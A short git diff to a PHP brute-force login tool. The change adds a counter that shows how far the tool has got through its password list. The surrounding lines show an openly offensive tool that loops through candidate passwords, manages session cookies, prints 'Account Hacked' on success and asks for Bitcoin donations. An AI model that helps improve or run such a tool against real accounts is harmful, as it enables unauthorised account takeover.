@@ -38,6 +38,9 @@ echo "\n\033[32m[!]\033[0m Starting the attack...\n\n";
 
 if (file_exists("cookie.txt")) { unlink("cookie.txt"); } // delete cookie if it exists.
 
+$loaded = count($passwords);
+$current = 1;
+
 /* Start The Bruteforce attack */
 foreach ($passwords as $password) {
 
@@ -127,8 +130,10 @@ foreach ($passwords as $password) {
 			echo "\n\033[32m[Success!]\033[0m Account Hacked [Username: \033[36m$username \033[0m| Password: \033[36m$password\033[0m] \n\n"; // success! :D
 			exit("Was this tool useful? Donate Some Bitcoin if you think I deserve: \n\033[36m1F9GbhE44FCHZ5KzcZBrDiFQYumYapxotC\033[0m \n\n");
 		} else {
-			echo "\033[31m[!]\033[0m Password Incorrect [$password] \n";
+			echo "\033[31m[!]\033[0m [".$current."/".$loaded."] Password Incorrect [$password] \n";
 		}
+
+		$current++;
 	
 		unlink("cookie.txt"); // remove the old cookie.
 
